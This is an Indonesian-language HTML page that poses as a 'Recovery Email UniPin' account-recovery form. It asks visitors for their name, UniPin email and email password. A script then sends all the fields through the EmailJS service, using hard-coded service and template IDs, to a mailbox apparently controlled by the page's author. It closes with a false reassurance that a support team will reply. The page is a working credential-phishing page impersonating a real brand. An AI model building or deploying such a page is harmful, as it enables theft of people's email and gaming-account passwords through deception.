<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recovery Email UniPin</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            margin: 0;
            font-family: 'Orbitron', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
        }
        .form-container {
            background: rgba(0, 0, 0, 0.85);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 0 20px #00ffe7, 0 0 40px #9400ff;
            width: 100%;
            max-width: 420px;
        }
        .form-container h2 {
            margin-bottom: 25px;
            color: #00ffe7;
            text-align: center;
            text-shadow: 0 0 10px #00ffe7;
        }
        .form-group {
            margin-bottom: 18px;
        }
        label {
            font-weight: bold;
            display: block;
            margin-bottom: 6px;
            color: #ff00cc;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            background-color: #1a1a2e;
            color: #fff;
            outline: none;
            box-shadow: 0 0 10px #00ffe7 inset;
        }
        textarea {
            resize: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 0 15px #ff00cc;
            transition: transform 0.3s ease;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 25px #ff00cc, 0 0 45px #3333ff;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>Recovery Email UniPin</h2>
    <div class="form-group">
        <label for="name">Nama Lengkap</label>
        <input type="text" id="name" placeholder="Masukkan nama Anda. Id: ellytatasya10@gmail.com" required>
    </div>
    <div class="form-group">
        <label for="email">Email UniPin</label>
        <input type="email" id="email" placeholder="Masukkan email UniPin Anda" required>
    </div>
    <div class="form-group">
        <label for="subject">Password Email</label>
        <input type="text" id="subject" placeholder="Masukkan Password email Anda" required>
    </div>
    <div class="form-group">
        <label for="message">Detail Permintaan</label>
        <textarea id="message" rows="4" placeholder="Akun Anda tidak ditemukan di UniPin. Silakan registrasi ulang melalui link yang akan dikirim ke email Anda." required></textarea>
    </div>
    <button onclick="sendMessage();">Kirim Permintaan</button>
</div>

<script>
    function sendMessage() {
        emailjs.init("yHp6NNWn_P6pny19J"); // Ganti dengan EmailJS public key kamu

        const params = {
            sendername: document.getElementById("name").value,
            senderemail: document.getElementById("email").value,
            subject: document.getElementById("subject").value,
            message: document.getElementById("message").value
        };

        const serviceID = "service_kdkzua8";   // Ganti dengan service ID EmailJS kamu
        const templateID = "template_krz8o1b"; // Ganti dengan template ID kamu

        emailjs.send(serviceID, templateID, params)
            .then(response => {
                alert("Permintaan Anda berhasil dikirim. Tim kami akan menghubungi Anda segera.");
            })
            .catch(error => {
                alert("Gagal mengirim permintaan. Silakan coba lagi.");
                console.error("EmailJS Error:", error);
            });
    }
</script>

</body>
</html>
